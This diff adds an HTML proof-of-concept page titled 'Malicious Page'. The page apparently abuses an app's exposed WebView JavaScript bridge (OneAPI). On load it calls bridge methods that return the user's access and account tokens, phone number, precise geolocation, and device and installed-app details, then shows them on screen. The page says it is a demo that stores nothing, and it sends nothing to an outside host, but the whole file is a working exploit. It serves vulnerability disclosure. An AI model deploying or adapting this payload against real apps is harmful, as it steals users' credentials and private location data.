@@ -1,0 +1,187 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" charset="UTF-8">
+    <style>
+        body {
+            margin: 0;
+            font-family: Arial, Helvetica, sans-serif;
+        }
+
+        .container {
+            width: 100%;
+            padding: 15px;
+        }
+
+        @media screen and (min-width: 700px) {
+            .container {
+                width: 70%;
+                margin: auto;
+            }
+        }
+
+        p {
+            white-space: pre-wrap;
+            word-wrap: break-word;
+            overflow-wrap: break-word;
+        }
+
+        .bold-and-larger {
+            font-weight: bold;
+            font-size: 1.5em;
+        }
+
+        .larger {
+            font-weight: bold;
+            font-size: 1.2em;
+        }
+    </style>
+    <title>Malicious Page</title>
+
+</head>
+
+
+<body>
+    <h1>Malicious Page</h1>
+
+    <p>!!! This is just a demo page, NO Sensitive Data will be stored!!!</p>
+
+    <p><span class="bold-and-larger">An attacker can:</span></p>
+
+    <p><span class="larger">Get Your Account Info:</span></p>
+    <p style="font-size: 15px;" id="AccountName"></p>
+    <p style="font-size: 15px;" id="AccountAvatarText">Your Avatar: </p>
+    <div class="image-with-text">
+        <img id="AccountAvatar" src="" alt="" width="30%" height="auto">
+    </div>
+    <p style="font-size: 15px;" id="UserID"></p>
+    <p style="font-size: 15px;" id="AccessToken"></p>
+    <p style="font-size: 15px;" id="AccountID"></p>
+    <p style="font-size: 15px;" id="AccountToken"></p>
+    <!-- <p style="font-size: 15px;" id="OpenID"></p> -->
+
+
+    <p><span class="larger">Get Your User Info:</span></p>
+    <p style="font-size: 15px;" id="PhoneNumber"></p>
+    <p style="font-size: 15px;" id="Gender"></p>
+
+    <p><span class="larger">Get Your Geolocation Info:</span></p>
+    <p style="font-size: 15px;" id="Country"></p>
+    <p style="font-size: 15px;" id="Province"></p>
+    <p style="font-size: 15px;" id="City"></p>
+    <p style="font-size: 15px;" id="District"></p>
+    <p style="font-size: 15px;" id="Town"></p>
+    <p style="font-size: 15px;" id="LocationName"></p>
+    <p style="font-size: 15px;" id="PreciseGeolocation"></p>
+
+
+    <p><span class="larger">Get Your Device Info:</span></p>
+    <p style="font-size: 15px;" id="QimeiID"></p>
+    <p style="font-size: 15px;" id="QQInstalled"></p>
+    <p style="font-size: 15px;" id="WechatInstalled"></p>
+
+
+    <script>
+
+    window.callback_accountList = function (res) {
+        var json = res;
+
+        // document.getElementById("AccountName").innerText = "Your Account Name: " + json.data.accountList[0].name;
+
+        // document.getElementById("Gender").innerText = "Your Gender: " + (json.data.accountList[0].sex == 1 ? "male" : (json.data.accountList[0].sex == 0 ? "female" : "unchosen"));
+
+        // document.getElementById("AccountAvatar").src = json.data.accountList[0].avatar;
+
+        // document.getElementById("UserID").innerText = "Your UserID: " + json.data.accountList[0].userId;
+
+        document.getElementById("AccountID").innerText = "Your Account ID: \n" + json.data.accountList[0].accountId;
+
+        document.getElementById("AccountToken").innerText = "Your Account Token: " + json.data.accountList[0].token;
+
+        document.getElementById("PhoneNumber").innerText = "Your Phone Number: " + "(" + json.data.accountList[0].dCode + ") " + json.data.accountList[0].phoneNumber;
+    }
+
+    window.callback_getAccountInfo = function (res) {
+        var json = res;
+        document.getElementById("UserID").innerText = "Your UserID: \n" + json.data.userId;
+
+        document.getElementById("AccessToken").innerText = "Your AccessToken: \n" + json.data.accessToken;
+
+        // document.getElementById("OpenID").innerText = "Your OpenID: " + json.data.openId;
+
+        document.getElementById("AccountName").innerText = "Your Account Name: " + json.data.name;
+
+        document.getElementById("Gender").innerText = "Your Gender: " + (json.data.sex == 1 ? "male" : (json.data.sex == 0 ? "female" : "unchosen"));
+
+        document.getElementById("AccountAvatar").src = json.data.icon;
+    }
+
+    window.callback_getAppEnv = function (res) {
+        var json = res;
+
+        document.getElementById("QQInstalled").innerText = "Is QQ Installed: " + (json.data.qqInstalled ? "true" : "false");
+
+        document.getElementById("WechatInstalled").innerText = "Is Wechat Installed: " + (json.data.wxInstalled ? "true" : "false");
+    }
+
+    window.callback_getLocation = function (res) {
+        var json = res;
+        document.getElementById("Country").innerText = "Your Country: " + json.data.ret.country;
+        document.getElementById("Province").innerText = "Your Province: " + json.data.ret.province;
+        document.getElementById("City").innerText = "Your City: " + json.data.ret.city;
+        document.getElementById("District").innerText = "Your District: " + json.data.ret.district;
+        document.getElementById("Town").innerText = "Your Town: " + json.data.ret.town;
+        document.getElementById("LocationName").innerText = "Your Location Name: \n" + json.data.ret.address;
+        document.getElementById("PreciseGeolocation").innerText = "Your Precise Geolocation: \n" + " (" + json.data.ret.longitude + ", " + json.data.ret.latitude + ")";
+    }
+
+    window.callback_getQimei = function (res){
+        var json = res;
+        document.getElementById("QimeiID").innerText = "Your QimeiID: \n" + json.data.qimei;
+    }
+
+    setTimeout(function () {
+        window.webkit.messageHandlers.OneAPI.postMessage({
+            "method": "accountList",
+            "callback": "callback_accountList",
+            "param": {
+            }
+        });
+
+        window.webkit.messageHandlers.OneAPI.postMessage({
+            "method": "getAccountInfo",
+            "callback": "callback_getAccountInfo",
+            "param": {
+            }
+        });
+
+        window.webkit.messageHandlers.OneAPI.postMessage({
+            "method": "getAppEnv",
+            "callback": "callback_getAppEnv",
+            "param": {
+            }
+        });
+
+        window.webkit.messageHandlers.OneAPI.postMessage({
+            "method": "getLocation",
+            "callback": "callback_getLocation",
+            "param": {
+            }
+        });
+
+        window.webkit.messageHandlers.OneAPI.postMessage({
+            "method": "getQimei",
+            "callback": "callback_getQimei",
+            "param": {
+            }
+        });
+
+    }, 500);
+
+
+    </script>
+
+</body>
+
+</html>
